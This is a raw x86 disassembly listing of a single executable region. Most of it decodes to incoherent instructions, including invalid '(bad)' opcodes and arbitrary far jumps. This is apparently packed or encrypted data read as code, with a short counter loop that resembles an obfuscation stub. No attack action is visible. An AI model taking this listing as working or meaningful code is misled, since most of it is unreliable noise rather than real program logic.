  411097:	cmc    
  411098:	dec    ecx
  411099:	shr    BYTE PTR [ecx],cl
  41109b:	jb     0x41109c
  41109d:	pop    esi
  41109e:	mov    bh,BYTE PTR [esi+0x59]
  4110a1:	sub    eax,0xd89dfc20
  4110a6:	arpl   WORD PTR [edi-0x4ef8a28c],si
  4110ac:	gs aam 0x94
  4110af:	xchg   esi,eax
  4110b0:	jbe    0x4110d8
  4110b2:	(bad)  
  4110b3:	aas    
  4110b4:	add    dl,ah
  4110b6:	mov    esi,0x97b3b8d2
  4110bb:	mov    ch,0xa
  4110bd:	test   DWORD PTR [ebp+0x26],esp
  4110c0:	popa   
  4110c1:	pop    es
  4110c2:	xchg   esp,eax
  4110c3:	jge    0x411063
  4110c5:	adc    dl,bh
  4110c7:	push   ebp
  4110c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110c9:	push   ecx
  4110ca:	popf   
  4110cb:	imul   eax,DWORD PTR [eax],0x18547288
  4110d1:	mov    bl,0x86
  4110d3:	stos   DWORD PTR es:[edi],eax
  4110d4:	xchg   edi,eax
  4110d5:	cs xchg bl,al
  4110d8:	xchg   esp,eax
  4110d9:	xlat   BYTE PTR ds:[ebx]
  4110da:	pushf  
  4110db:	dec    edx
  4110dc:	outs   dx,BYTE PTR ds:[esi]
  4110dd:	sbb    DWORD PTR [edi-0x5fa8cca8],0xfffffff1
  4110e4:	lds    eax,FWORD PTR [edi+ebx*8]
  4110e7:	mov    cl,0x47
  4110e9:	xchg   ecx,eax
  4110ea:	retf   
  4110eb:	or     BYTE PTR [ebp+0x46],0x33
  4110ef:	outs   dx,BYTE PTR ds:[esi]
  4110f0:	jno    0x41114a
  4110f2:	mov    ebp,0xa58ab2f1
  4110f7:	jo     0x411154
  4110f9:	add    esi,DWORD PTR [ebx]
  4110fb:	jmp    0x406:0x93949c2e
  411102:	std    
  411103:	ins    BYTE PTR es:[edi],dx
  411104:	xchg   ecx,eax
  411105:	jp     0x41117a
  411107:	mov    esp,0x8e969b5a
  41110c:	pop    esp
  41110d:	dec    ebx
  41110e:	sbb    al,0x48
  411110:	loop   0x411114
  411112:	sbb    eax,DWORD PTR [ecx+0x35]
  411115:	pop    esp
  411116:	push   eax
  411117:	(bad)  
  411118:	outs   dx,DWORD PTR ds:[esi]
  411119:	(bad)  
  41111a:	(bad)  
  41111b:	ja     0x411133
  41111d:	(bad)  
  41111e:	shr    DWORD PTR [ecx+eax*1-0x64],1
  411122:	jmp    0x4110da
  411124:	outs   dx,DWORD PTR ds:[esi]
  411125:	into   
  411126:	mov    cs,WORD PTR [ebx]
  411128:	add    al,0xaa
  41112a:	and    DWORD PTR [ebp+0x5cbbb350],0x5a
  411131:	test   dh,dh
  411133:	popf   
  411134:	sub    al,0xdb
  411136:	push   ebp
  411137:	mov    edi,0x9eb1e088
  41113c:	in     al,dx
  41113d:	cwde   
  41113e:	mov    esi,ds
  411140:	ret    
  411141:	sub    ecx,DWORD PTR [ebp+0x1c]
  411144:	xor    DWORD PTR ds:0x41d3bafc,0x7eb42829
  41114e:	push   0x16
  411150:	mov    eax,ds:0xc8324d7
  411155:	jb     0x4111d5
  411157:	mov    ecx,0x49f27bba
  41115c:	mov    ds:0xd772ee13,al
  411161:	and    DWORD PTR [ebx-0x6],eax
  411164:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  411166:	leave  
  411167:	fist   DWORD PTR [esi]
  411169:	aaa    
  41116a:	xor    BYTE PTR [ecx-0x69],0xff
  41116e:	and    DWORD PTR [esi],esi
  411170:	ins    BYTE PTR es:[edi],dx
  411171:	and    edi,DWORD PTR es:[ecx+0x64]
  411175:	cmp    eax,0x20954df2
  41117a:	daa    
  41117b:	sar    DWORD PTR [eax],0x22
  41117e:	stos   DWORD PTR es:[edi],eax
  41117f:	fist   DWORD PTR [edi]
  411181:	sub    eax,0xbc9b3abf
  411186:	push   esi
  411187:	loopne 0x411112
  411189:	inc    edi
  41118a:	retf   0xe22c
  41118d:	inc    ebx
  41118e:	dec    eax
  41118f:	or     cl,BYTE PTR [ecx-0x2f]
  411192:	cmp    ch,BYTE PTR ds:0x6717ab46
  411198:	je     0x411135
  41119a:	xor    eax,DWORD PTR [edx-0x4]
  41119d:	pop    es
  41119e:	mov    dh,0x11
  4111a0:	out    0xdf,eax
  4111a2:	stos   BYTE PTR es:[edi],al
  4111a3:	jnp    0x411211
  4111a5:	push   ds
  4111a6:	test   DWORD PTR [edi+0x6b],esp
  4111a9:	(bad)  
  4111aa:	je     0x4111b5
  4111ac:	push   ebp
  4111ad:	ret    
  4111ae:	mov    ebp,DWORD PTR fs:[eax]
  4111b1:	sbb    BYTE PTR [ecx],bh
  4111b3:	lahf   
  4111b4:	xchg   ebp,eax
  4111b5:	fmul   DWORD PTR [ecx]
  4111b7:	fwait
  4111b8:	in     eax,0x56
  4111ba:	stos   DWORD PTR es:[edi],eax
  4111bb:	sbb    al,0x5e
  4111bd:	out    dx,al
  4111be:	repz pushf 
  4111c0:	iret   
  4111c1:	daa    
  4111c2:	push   cs
  4111c3:	aas    
  4111c4:	ret    
  4111c5:	mov    ds:0xa58d5453,eax
  4111ca:	mov    ebx,0xa1dcc1f2
  4111cf:	(bad)
  4111d3:	dec    esp
  4111d4:	inc    edx
  4111d5:	push   ss
  4111d6:	mov    bl,0x8a
  4111d8:	mov    WORD PTR [eax],es
  4111da:	daa    
  4111db:	dec    edx
  4111dc:	cmp    ch,0x65
  4111df:	(bad)  
  4111e0:	and    BYTE PTR ds:0xd24d1077,bl
  4111e6:	add    DWORD PTR [edx+edi*4],esi
  4111e9:	xor    BYTE PTR [ecx+0x4c12e670],ch
  4111ef:	mov    eax,ds:0xca5ea1b5
  4111f4:	mov    esi,0x50abdc88
  4111f9:	aaa    
  4111fa:	push   0x55bcd581
  4111ff:	mov    cl,0x4e
  411201:	pop    ecx
  411202:	mov    ds:0xb0dd7d8,al
  411207:	femms  
  411209:	ja     0x411198
  41120b:	arpl   WORD PTR [ecx-0x721bdee0],di
  411211:	ins    BYTE PTR es:[edi],dx
  411212:	and    cl,BYTE PTR [ebp-0x163e3dd4]
  411218:	push   0xe922d8ea
  41121d:	mul    dl
  41121f:	rol    BYTE PTR [edi],1
  411221:	pop    es
  411222:	add    edi,DWORD PTR [eax-0x5e59a981]
  411228:	add    eax,0xffa6f3af
  41122d:	and    al,0xae
  41122f:	push   ecx
  411230:	int    0x34
  411232:	fldcw  WORD PTR [edx+0x5439711e]
  411238:	mov    edi,0x3f79bbbc
  41123d:	jne    0x4111e6
  41123f:	lahf   
  411240:	and    BYTE PTR fs:[ebx+0x69459aee],ah
  411247:	outs   dx,DWORD PTR ds:[esi]
  411248:	ret    0x344a
  41124b:	stc    
  41124c:	es (bad) 
  41124e:	not    eax
  411250:	test   DWORD PTR [esi],edi
  411252:	aaa    
  411253:	leave  
  411254:	neg    BYTE PTR [edx-0x14]
  411257:	pop    ss
  411258:	dec    ebx
  411259:	popa   
  41125a:	add    dh,0x4e
  41125d:	aaa    
  41125e:	fisttp DWORD PTR [ebp+0x722a1679]
  411264:	mov    dl,0x76
  411266:	mov    edx,0x603398e7
  41126b:	mov    edi,0xb27d660b
  411270:	psrld  mm2,QWORD PTR [eax+0x40]
  411274:	scas   al,BYTE PTR es:[edi]
  411275:	leave  
  411276:	dec    ebp
  411277:	push   esi
  411278:	mov    eax,gs
  41127a:	(bad)  
  41127b:	popf   
  41127c:	imul   ebx,DWORD PTR [edi+0x52],0x31d8a0ac
  411283:	ficomp WORD PTR [ebx-0xabc8e47]
  411289:	push   esi
  41128a:	dec    edx
  41128b:	in     eax,dx
  41128c:	xlat   BYTE PTR ds:[ebx]
  41128d:	xchg   DWORD PTR [edx+eiz*8],ecx
  411290:	mov    dh,BYTE PTR [ebp+0x357c69d0]
  411296:	pop    ss
  411297:	inc    ebx
  411298:	jae    0x411226
  41129a:	daa    
  41129b:	push   edx
  41129c:	mov    edi,?
  41129e:	cmp    esi,DWORD PTR [edi+0x76]
  4112a1:	push   esi
  4112a2:	call   0x35a8:0x33d75608
  4112a9:	ja     0x41130f
  4112ab:	(bad)  
  4112ac:	adc    DWORD PTR [esi+0x37],esi
  4112af:	out    dx,al
  4112b0:	test   ch,ah
  4112b2:	cmc    
  4112b3:	sbb    al,BYTE PTR [edx]
  4112b5:	mov    esi,DWORD PTR [esi]
  4112b7:	jo     0x41132e
  4112b9:	ja     0x411300
  4112bb:	int    0x65
  4112bd:	xchg   ebx,eax
  4112be:	aas    
  4112bf:	les    esi,FWORD PTR [ecx-0x40]
  4112c2:	pop    esi
  4112c3:	add    al,0x45
  4112c5:	or     dl,ah
  4112c7:	mov    dh,0x35
  4112c9:	cmp    eax,0x58c4f2fe
  4112ce:	test   eax,0x8d48ca71
  4112d3:	and    DWORD PTR [eax],eax
  4112d5:	inc    ebp
  4112d6:	out    dx,al
  4112d7:	dec    esi
  4112d8:	cmp    esi,DWORD PTR [ebp+0x1d608b98]
  4112de:	push   ecx
  4112df:	stos   BYTE PTR es:[edi],al
  4112e0:	jnp    0x4112d8
  4112e2:	addr16 mov ah,0x8
  4112e5:	inc    ebx
  4112e6:	add    dh,BYTE PTR [ebp-0x1fd0d44b]
  4112ec:	scas   al,BYTE PTR es:[edi]
  4112ed:	ja     0x4112b8
  4112ef:	jmp    0x58898f25
  4112f4:	js     0x411337
  4112f6:	jo     0x41133c
  4112f8:	sbb    al,0x34
  4112fa:	in     eax,0x82
  4112fc:	rcl    ebp,0x38
  4112ff:	xchg   ebx,eax
  411300:	dec    esp
  411301:	xlat   BYTE PTR ds:[ebx]
  411302:	cs cmc 
  411304:	sbb    al,0xd4
  411306:	xchg   BYTE PTR [edx-0x145c5578],bh
  41130c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41130d:	sbb    dl,BYTE PTR [edx+eax*2]
  411310:	jne    0x411334
  411312:	mov    ebx,0x1a0a1a54
  411317:	fld    TBYTE PTR [eax+0x1223979d]
  41131d:	dec    edi
  41131e:	pop    eax
  41131f:	jmp    0x54c0:0xf43f5d9d
  411326:	sub    DWORD PTR [ecx],eax
  411328:	dec    eax
  411329:	cs push esp
  41132b:	adc    al,0xe5
  41132d:	lahf   
  41132e:	xchg   edi,eax
  41132f:	cs retf 
  411331:	shl    DWORD PTR [eax+0x4e],0x98
  411335:	and    eax,0x64583a7
  41133a:	fwait
  41133b:	retf   
  41133c:	mov    gs,edi
  41133e:	cli    
  41133f:	call   0x144b72da
  411344:	inc    eax
  411345:	mov    eax,0x4c957718
  41134a:	enter  0x455c,0xe8
  41134e:	xchg   ebx,eax
  41134f:	pop    es
  411350:	clc    
  411351:	out    dx,al
  411352:	inc    esi
  411353:	stos   DWORD PTR es:[edi],eax
  411354:	lahf   
  411355:	sub    DWORD PTR [edi],edx
  411357:	dec    eax
  411358:	sbb    dh,bh
  41135a:	cdq    
  41135b:	test   edx,edx
  41135d:	mov    bl,0x6d
  41135f:	es adc dl,ch
  411362:	or     BYTE PTR [edi+0x7],0xfc
  411366:	loop   0x411322
  411368:	sub    ebp,ebp
  41136a:	mov    ecx,0xe6224f57
  41136f:	ss and ch,al
  411372:	outs   dx,DWORD PTR ds:[esi]
  411373:	mov    ebx,0xa2176f4e
  411378:	sbb    dl,BYTE PTR [edi+0x7e]
  41137b:	test   DWORD PTR [esi+0x35],ebp
  41137e:	jp     0x4113f4
  411380:	out    dx,eax
  411381:	pop    ss
  411382:	in     eax,0x8f
  411384:	lea    esi,[ebx]
  411386:	fucomp st(0)
  411388:	test   eax,0xe52c24ac
  41138d:	pop    esp
  41138e:	(bad)  
  41138f:	jnp    0x4113e1
  411391:	dec    ebx
  411392:	inc    esp
  411393:	mov    al,0x1a
  411395:	or     dl,0xf5
  411398:	iret   
  411399:	inc    esp
  41139a:	jecxz  0x411352
  41139c:	pop    ebp
  41139d:	pop    eax
  41139e:	lods   eax,DWORD PTR ds:[esi]
  41139f:	sar    DWORD PTR [ebx],cl
  4113a1:	mov    esi,0xacbbb2d6
  4113a6:	test   DWORD PTR [eax],ebp
  4113a8:	cmp    al,0x1c
  4113aa:	test   dl,ch
  4113ac:	jg     0x4113ce
  4113ae:	retf   0x94b
  4113b1:	ret    0x508b
  4113b4:	outs   dx,DWORD PTR ds:[esi]
  4113b5:	into   
  4113b6:	jmp    0x411428
  4113b8:	sahf   
  4113b9:	mov    bl,0x5c
  4113bb:	popa   
  4113bc:	adc    al,0x65
  4113be:	adc    esp,DWORD PTR [edx+0xf6a0e4d]
  4113c4:	cmp    eax,esi
  4113c6:	mov    DWORD PTR ds:0x42fcf1,0x78e4
  4113d0:	je     0x411c9a
  4113d6:	mov    eax,ds:0x41b224
  4113db:	and    DWORD PTR ds:0x42fd7a,0x0
  4113e5:	mov    esi,DWORD PTR ds:0x42fd7a
  4113eb:	inc    esi
  4113ec:	mov    DWORD PTR ds:0x42fd7a,esi
  4113f2:	cmp    DWORD PTR ds:0x42fd7a,0x8
  4113f9:	jne    0x41140f
  4113ff:	push   0x42e1e7
  411404:	push   0x42e26d
  411409:	call   DWORD PTR ds:0x42e567
  41140f:	cmp    DWORD PTR ds:0x42fd7a,0x7
  411416:	jne    0x411429
  41141c:	mov    esi,DWORD PTR ds:0x42fd7a
  411422:	inc    esi
  411423:	mov    DWORD PTR ds:0x42fd7a,esi
  411429:	cmp    DWORD PTR ds:0x42fd7a,0x13
  411430:	jb     0x4113e5
  411436:	jmp    0x41183b
  41143b:	and    cl,al
  41143d:	leave  
  41143e:	adc    ch,cl
  411440:	adc    ecx,esp
  411442:	call   0xcb53bead
  411447:	xlat   BYTE PTR ds:[ebx]
  411448:	and    edi,DWORD PTR [ecx-0x31]
  41144b:	push   cs
  41144c:	dec    edx
  41144d:	jo     0x4114bf
  41144f:	pop    eax
  411450:	jge    0x4114c2
  411452:	jo     0x4114af
  411454:	xchg   ebx,eax
  411455:	sbb    DWORD PTR [ebp+ebp*2-0x32],ebx
  411459:	and    ecx,DWORD PTR [esp+ebp*2-0x52bae22d]
  411460:	mov    esp,0xec0da8b2
  411465:	pop    ecx
  411466:	jne    0x41143b
  411468:	add    al,0xa5
  41146a:	add    bh,BYTE PTR [eax+0x81e856b]
  411470:	xchg   BYTE PTR [ecx-0x52],ah
  411473:	pop    es
  411474:	add    BYTE PTR [esi-0x44b4d2b0],dh
  41147a:	xor    eax,0xe10b7727
  41147f:	sti    
  411480:	xchg   eax,eax
  411482:	or     edx,DWORD PTR [edx-0x74a537fd]
  411488:	lods   al,BYTE PTR ds:[esi]
  411489:	xchg   ebx,eax
  41148a:	jns    0x411429
  41148c:	cmp    DWORD PTR [edi-0x79],esp
  41148f:	shl    bh,cl
  411491:	sar    BYTE PTR [ebp+0x6d53d2b0],cl
  411497:	(bad)  
  411498:	ficom  WORD PTR [ebp-0x8]
  41149b:	and    eax,0x5b20192e
  4114a0:	jg     0x4114e3
  4114a2:	fistp  WORD PTR [esi-0x1d746453]
  4114a8:	iret   
  4114a9:	add    al,0x3b
  4114ab:	scas   al,BYTE PTR es:[edi]
  4114ac:	inc    edi
  4114ad:	ja     0x4114f3
  4114af:	in     al,dx
  4114b0:	xchg   ecx,eax
  4114b1:	sbb    BYTE PTR [esi+0x26],bh
  4114b4:	fwait
  4114b5:	add    ch,bl
  4114b7:	pushf  
  4114b8:	shl    DWORD PTR [edi-0x373a62dd],0x23
  4114bf:	ret    0xc11e
  4114c2:	scas   eax,DWORD PTR es:[edi]
  4114c3:	rol    DWORD PTR [edx+ebp*2+0xe],0xa0
  4114c8:	aam    0x5b
  4114ca:	outs   dx,DWORD PTR ds:[esi]
  4114cb:	adc    eax,0x3c03b7d3
  4114d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114d1:	call   FWORD PTR [esi+0x7c8c2bfe]
  4114d7:	imul   ebp,DWORD PTR [ebx-0x73],0x2b
  4114db:	stc    
  4114dc:	popf   
  4114dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114de:	jnp    0x41155c
  4114e0:	addr16 xor eax,0x493eee8e
  4114e6:	jnp    0x4114af
  4114e8:	xchg   al,dl
  4114ea:	pop    ebx
  4114eb:	lods   eax,DWORD PTR ss:[esi]
  4114ed:	cmp    esp,eax
  4114ef:	jle    0x41156b
  4114f1:	in     eax,0x72
  4114f3:	add    BYTE PTR [ebx],bh
  4114f5:	lods   al,BYTE PTR ds:[esi]
  4114f6:	push   ss
  4114f7:	or     bh,ch
  4114f9:	dec    ebx
  4114fa:	(bad)  
  4114fb:	out    dx,al
  4114fc:	mov    dh,0x43
  4114fe:	pop    edi
  4114ff:	adc    eax,0xe4b34b1e
  411504:	imul   ebp,DWORD PTR [ebx+0x2],0xdec73a48
  41150b:	mov    edx,0x66a86a8
  411510:	xor    ch,BYTE PTR [ecx-0x1fba4095]
  411516:	pop    edi
  411517:	out    0x86,eax
  411519:	repz xchg dl,ah
  41151c:	aad    0x87
  41151e:	pop    edx
  41151f:	dec    ebx
  411520:	and    DWORD PTR [ebx-0x14],0x2e328811
  411527:	sub    DWORD PTR [edx-0xb],esp
  41152a:	fwait
  41152b:	xchg   BYTE PTR [eax],ah
  41152d:	gs das 
  41152f:	les    esi,FWORD PTR [esi+0x6232345e]
  411535:	dec    ebx
  411536:	lods   eax,DWORD PTR ds:[esi]
  411537:	test   eax,0xcb5ca14d
  41153c:	adc    dl,ch
  41153e:	lds    edx,FWORD PTR [eax]
  411540:	cmp    al,0xc6
  411542:	popf   
  411543:	stos   DWORD PTR es:[edi],eax
  411544:	loopne 0x411569
  411546:	inc    esp
  411547:	xor    ecx,ebp
  411549:	push   esp
  41154a:	je     0x41156e
  41154c:	and    ch,ch
  41154e:	xchg   ebx,eax
  41154f:	and    eax,0x40bd8629
  411554:	adc    cl,bl
  411556:	hlt    
  411557:	jae    0x411584
  411559:	out    dx,eax
  41155a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41155b:	mov    eax,ds:0xc1341875
  411560:	(bad)  
  411561:	std    
  411562:	dec    eax
  411563:	data16 jne 0x411566
  411566:	in     eax,0xc9
  411568:	(bad)  
  411569:	inc    BYTE PTR [eax-0x155e0969]
  41156f:	icebp  
  411570:	pushf  
  411571:	lods   eax,DWORD PTR ds:[esi]
  411572:	loope  0x411539
  411574:	add    bh,BYTE PTR [esi+edi*4-0x72d244eb]
  41157b:	fcomp  st(7)
  41157d:	inc    BYTE PTR [eax+0x58ec99fb]
  411583:	mov    esp,0x2a53c765
  411588:	(bad)  
  411589:	fld    DWORD PTR fs:[eax]
  41158c:	ds cli 
  41158e:	daa    
  41158f:	adc    BYTE PTR [edi],dl
  411591:	lds    ebp,FWORD PTR [esi-0x1]
  411594:	test   edi,esi
  411596:	(bad)  
  411597:	aas    
  411598:	jp     0x411523
  41159a:	xor    BYTE PTR [edx],cl
  41159c:	sub    DWORD PTR [edi+0x75],edi
  41159f:	push   ecx
  4115a0:	in     al,0x4f
  4115a2:	mov    ecx,0xc7768586
  4115a7:	test   al,0x4a
  4115a9:	push   ebp
  4115aa:	(bad)  
  4115ab:	leave  
  4115ac:	jae    0x4115eb
  4115ae:	or     ecx,0xe4778688
  4115b4:	jp     0x4115d8
  4115b6:	call   0xe7ea:0x945128d3
  4115bd:	test   eax,0xf7eaadb5
  4115c2:	(bad)  
  4115c4:	cmp    eax,0x51443082
  4115c9:	push   edi
  4115ca:	dec    eax
  4115cb:	sti    
  4115cc:	hlt    
  4115cd:	scas   eax,DWORD PTR es:[edi]
  4115ce:	cmp    DWORD PTR [eax],ebp
  4115d0:	ins    DWORD PTR es:[edi],dx
  4115d1:	imul   edi,DWORD PTR [ecx],0xb827b195
  4115d7:	iret   
  4115d8:	iret   
  4115d9:	in     eax,dx
  4115da:	clc    
  4115db:	out    dx,eax
  4115dc:	int3   
  4115dd:	adc    edx,DWORD PTR [ebp-0x5aae3552]
  4115e3:	or     ch,BYTE PTR ds:0x2d63826c
  4115e9:	inc    edx
  4115ea:	sub    edi,DWORD PTR [ebx]
  4115ec:	cmc    
  4115ed:	pop    eax
  4115ee:	ins    BYTE PTR es:[edi],dx
  4115ef:	mov    ebp,0x9aa21c3d
  4115f4:	mov    ebp,DWORD PTR [esi]
  4115f6:	popf   
  4115f7:	mov    esp,DWORD PTR ds:0x949980a0
  4115fd:	sahf   
  4115fe:	sbb    dl,bl
  411600:	sahf   
  411601:	mov    ah,0x92
  411603:	pop    eax
  411604:	mov    WORD PTR es:[edi],ds
  411607:	xchg   ebp,eax
  411608:	adc    dh,bl
  41160a:	(bad)  
  41160b:	sahf   
  41160c:	push   ebp
  41160d:	test   edx,eax
  41160f:	lea    edx,[edx+eax*8-0x40]
  411613:	rol    DWORD PTR [esi],cl
  411615:	mov    ecx,0x48858083
  41161a:	call   0xe30e:0xea8aa58e
  411621:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411622:	xor    eax,DWORD PTR [esi+0x60]
  411625:	push   ebx
  411626:	dec    ebx
  411627:	dec    esi
  411628:	popa   
  411629:	test   al,0x1e
  41162b:	pushf  
  41162c:	loop   0x4116ab
  41162e:	adc    DWORD PTR [eax-0x451a26a7],0xcf42ec75
  411638:	dec    esp
  411639:	or     DWORD PTR [edx+0x76a2af9],edi
  41163f:	sbb    bl,BYTE PTR [edx-0x7]
  411642:	jno    0x4116ab
  411644:	dec    ebp
  411645:	and    DWORD PTR [edi+0x25],esi
  411648:	mov    ?,esi
  41164a:	sbb    eax,0x64fcf20c
  41164f:	inc    esp
  411650:	inc    ecx
  411651:	mov    ch,0xb2
  411653:	std    
  411654:	mov    dl,0xac
  411656:	mov    ebp,0xd5a2f59
  41165b:	pop    ecx
  41165c:	bound  ecx,QWORD PTR ds:0x7a2b3d48
  411662:	mov    dl,0xdc
  411664:	mov    dh,0xa2
  411666:	inc    esi
  411667:	or     BYTE PTR ds:0x714a99a2,ch
  41166d:	jno    0x411626
  41166f:	dec    eax
  411670:	stos   BYTE PTR es:[edi],al
  411671:	(bad)  
  411672:	push   ds
  411673:	test   eax,0x81310cc7
  411678:	shl    DWORD PTR [eax+0x4b],1
  41167b:	sub    edx,DWORD PTR [ebx+eiz*8]
  41167e:	add    eax,0xbf5a8778
  411683:	mov    dl,BYTE PTR [edi]
  411685:	fwait
  411686:	neg    BYTE PTR [ecx-0x8d3ed5e]
  41168c:	aam    0x93
  41168e:	lahf   
  41168f:	jmp    0x331cfba
  411694:	inc    esp
  411695:	cdq    
  411696:	pop    ss
  411697:	call   0x69e6:0x1565e5a7
  41169e:	xor    edx,DWORD PTR [edi-0x1cdc12d7]
  4116a4:	frstor [ebp-0x2b]
  4116a7:	dec    ebx
  4116a8:	retf   
  4116a9:	stos   BYTE PTR es:[edi],al
  4116aa:	(bad)  
  4116ab:	mov    ebx,ebp
  4116ad:	sub    ch,BYTE PTR [ecx+0x28f82425]
  4116b3:	pop    ecx
  4116b4:	shl    BYTE PTR [edx-0x1aca0c19],0xd1
  4116bb:	jae    0x411660
  4116bd:	xchg   ebx,eax
  4116be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116bf:	cmp    al,0xb6
  4116c1:	or     DWORD PTR [ebp-0x69acdf9],esi
  4116c7:	sahf   
  4116c8:	(bad)  
  4116c9:	es repz push eax
  4116cc:	out    dx,eax
  4116cd:	pop    edx
  4116ce:	fist   WORD PTR [edi+0x67]
  4116d1:	cmp    eax,0xc6bc79d9
  4116d6:	inc    edx
  4116d7:	pop    edi
  4116d8:	mov    ds:0x66cb1e2b,al
  4116dd:	pop    ebp
  4116de:	popf   
  4116df:	in     al,0x48
  4116e1:	fnstenv [edx]
  4116e3:	xchg   BYTE PTR [ecx+0x1e2c4b22],dl
  4116e9:	jnp    0x41169b
  4116eb:	jae    0x4116e4
  4116ed:	repz cwde 
  4116ef:	jle    0x4116b4
  4116f1:	jbe    0x41169e
  4116f3:	pop    ss
  4116f4:	jo     0x411687
  4116f6:	adc    BYTE PTR [esi],dl
  4116f8:	mov    WORD PTR [ebx+0x61b34eb2],ds
  4116fe:	cmp    dl,BYTE PTR ds:0xaf8f72d9
  411704:	mov    DWORD PTR [esi],esi
  411706:	xor    DWORD PTR [edx-0x21],0xffffff90
  41170a:	cs mov bh,0x5d
  41170d:	xchg   BYTE PTR [ebp-0x7b],ah
  411710:	out    dx,al
  411711:	outs   dx,BYTE PTR ds:[esi]
  411712:	lods   eax,DWORD PTR ds:[esi]
  411713:	fild   WORD PTR [esi-0x2]
  411716:	jmp    0xc190:0xf94a961b
  41171d:	add    BYTE PTR [ecx-0x5d],0x48
  411721:	xor    DWORD PTR [eax],eax
  411723:	sbb    eax,0x3abc299c
  411728:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411729:	stos   DWORD PTR es:[edi],eax
  41172a:	push   es
  41172b:	inc    esp
  41172c:	push   edi
  41172d:	call   0xa3693526
  411732:	mov    ch,0x74
  411734:	mov    eax,0xb34b54c7
  411739:	dec    ebp
  41173a:	rol    DWORD PTR [edi+0x2e],1
  41173d:	dec    DWORD PTR [edi+0x1a21b2f8]
  411743:	jl     0x41179e
  411745:	fsubr  QWORD PTR [edx-0x2c93412]
  41174b:	fld    DWORD PTR [ecx-0x26e981e0]
  411751:	adc    al,0x3d
  411753:	mov    ebx,0x63197f17
  411758:	dec    eax
  411759:	jne    0x4116f8
  41175b:	imul   edi,DWORD PTR [ecx],0xffffff90
  41175e:	out    0x6f,al
  411760:	les    ebp,FWORD PTR [ebx+0x2f]
  411763:	and    dl,BYTE PTR [edx]
  411765:	push   ds
  411766:	cmp    DWORD PTR [ecx+0x41],edi
  411769:	out    dx,al
  41176a:	mov    al,bh
  41176c:	sbb    dh,ch
  41176e:	enter  0x7e75,0x30
  411772:	mov    bl,0xa7
  411774:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411775:	shr    dh,cl
  411777:	retf   
  411778:	in     eax,dx
  411779:	div    DWORD PTR [ebp+edi*4-0x1e92b931]
  411780:	xchg   edi,eax
  411781:	dec    edi
  411782:	xchg   esi,eax
  411783:	xchg   BYTE PTR [eax+edx*8+0x6],bl
  411787:	dec    eax
  411788:	mov    ?,WORD PTR [eax+ecx*2]
  41178b:	stos   DWORD PTR es:[edi],eax
  41178c:	jb     0x411727
  41178e:	aaa    
  41178f:	sbb    eax,0x6b316eea
  411794:	adc    dl,BYTE PTR [esi-0x6b1d2659]
  41179a:	mov    ch,0x1e
  41179c:	jge    0x4117d1
  41179e:	jecxz  0x4117bb
  4117a0:	rcr    BYTE PTR ds:[ebp+edi*4-0x63],0xd7
  4117a6:	and    eax,0xe6c0003f
  4117ab:	fadd   QWORD PTR [edi]
  4117ad:	fsubr  st,st(4)
  4117af:	mov    ds:0xe1ce0fae,eax
  4117b4:	iret   
  4117b5:	cmp    BYTE PTR [ecx+0x25470e28],al
  4117bb:	jle    0x4117d4
  4117bd:	arpl   WORD PTR [ebx],bx
  4117bf:	sub    ch,BYTE PTR [esi-0x5]
  4117c2:	jae    0x41180f
  4117c4:	mov    bh,0xcc
  4117c6:	imul   sp
  4117c9:	mov    cl,BYTE PTR [edi-0x55]
  4117cc:	mov    al,ds:0x4797b334
  4117d1:	cmc    
  4117d2:	adc    bh,dl
  4117d4:	dec    ecx
  4117d5:	enter  0x9025,0x9f
  4117d9:	cld    
  4117da:	jl     0x41184a
  4117dc:	jo     0x41183b
  4117de:	push   ecx
  4117df:	mov    ch,0xd4
  4117e1:	push   esi
  4117e2:	lods   al,BYTE PTR ds:[esi]
  4117e3:	dec    eax
  4117e4:	inc    eax
  4117e5:	adc    ebx,DWORD PTR [ecx+0x57cbb15f]
  4117eb:	pusha  
  4117ec:	mov    ds:0xbb6fe5ac,al
  4117f1:	jbe    0x4117e0
  4117f3:	jnp    0x41181d
  4117f5:	out    0x74,al
  4117f7:	or     DWORD PTR [ebx+0x37],ecx
  4117fa:	adc    cl,BYTE PTR [edi+0x35]
  4117fd:	popf   
  4117fe:	std    
  4117ff:	(bad)  
  411801:	arpl   bx,cx
  411803:	push   0x2a4d4a17
  411808:	xor    edi,DWORD PTR [edi-0x2fad1896]
  41180e:	call   0xa544d4a6
  411813:	sub    al,BYTE PTR [edi+0x4573478a]
  411819:	jne    0x4117b3
  41181b:	and    DWORD PTR [ebx-0x1e22fb4f],0x490a1460
  411825:	push   0x4
  411827:	adc    bh,0xf9
  41182a:	push   0x1034b259
  41182f:	call   0xffca:0x5b15140a
  411836:	push   esp
  411837:	jg     0x41183a
  411839:	sub    eax,0xc758bad
  41183e:	sub    eax,edx
  411840:	add    DWORD PTR ds:0x42fcf5,0x7f3f
  41184a:	xor    eax,ecx
  41184c:	mov    DWORD PTR ds:0x42fd7a,0x5771
  411856:	cmp    eax,esi
  411858:	mov    DWORD PTR ds:0x42fd76,0x752
  411862:	jne    0x411c7d
  411868:	jmp    0x411c6d
  41186d:	js     0x411844
  41186f:	stos   BYTE PTR es:[edi],al
  411870:	loopne 0x4118db
  411872:	jae    0x4118b6
  411874:	cmc    
  411875:	pop    esi
  411876:	sub    BYTE PTR [ecx+0x46d1a6e9],dl
  41187c:	pop    edx
  41187d:	jbe    0x4118d6
  41187f:	jo     0x4118f1
  411881:	pop    eax
  411882:	jge    0x4118f4
  411884:	jo     0x4118ee
  411886:	je     0x41183b
  411888:	ret    
  411889:	daa    
  41188a:	or     DWORD PTR [edx],0xffffffb4
  41188d:	inc    edx
  41188e:	stos   DWORD PTR es:[edi],eax
  41188f:	test   eax,0xb03be3e6
  411894:	rcr    BYTE PTR [eax],0xa1
  411897:	sub    al,0x60
  411899:	ror    DWORD PTR [ebx+edi*4],cl
  41189c:	data16 mov al,ds:0x78591d51
  4118a2:	xchg   esp,eax
